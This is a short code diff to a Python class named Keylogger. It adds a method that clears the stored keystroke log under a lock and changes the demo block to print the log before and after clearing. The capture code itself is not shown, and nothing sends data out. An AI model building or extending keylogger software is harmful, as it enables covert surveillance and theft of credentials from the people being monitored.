@@ -62,11 +62,19 @@ class Keylogger:
         keylog = self.__keylog
         self.__lock.release()
         return keylog
+    
 
+    def clear_keylog(self):
+        self.__lock.acquire()
+        self.__keylog = ""
+        self.__lock.release()
+    
 
 if __name__ == "__main__":
     k = Keylogger()
     k.start()
     time.sleep(15)
     k.stop()
-    print(k.get_keylog())
+    print(f"Before: {k.get_keylog()}")
+    k.clear_keylog()
+    print(f"After: {k.get_keylog()}")
